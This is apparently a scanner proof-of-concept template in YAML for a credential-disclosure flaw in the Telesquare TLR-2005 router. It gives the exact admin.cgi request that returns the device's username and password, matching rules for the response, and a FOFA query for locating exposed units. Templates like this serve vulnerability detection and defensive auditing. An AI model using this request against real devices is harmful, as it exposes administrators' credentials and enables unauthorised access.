id: poc-yaml-telesquare-tlr2005-getusernamepassword-info-leak
info:
  name: telesquare tlr2005 getusernamepassword 信息泄露漏洞
  severity: high
  tags:
  - 信息泄露
  finger: telesquare
  fofa: app="TELESQUARE-TLR-2005KSH"
requests:
- method: GET
  path: /cgi-bin/admin.cgi?Command=getUsernamePassword
  expression: 'status_code == 200 &&

    matches(body,"<username>.*?</username>") &&

    contains(body,"<password>") &&

    contains(content_type,"text/xml")

    '
variables: {}
transport: http
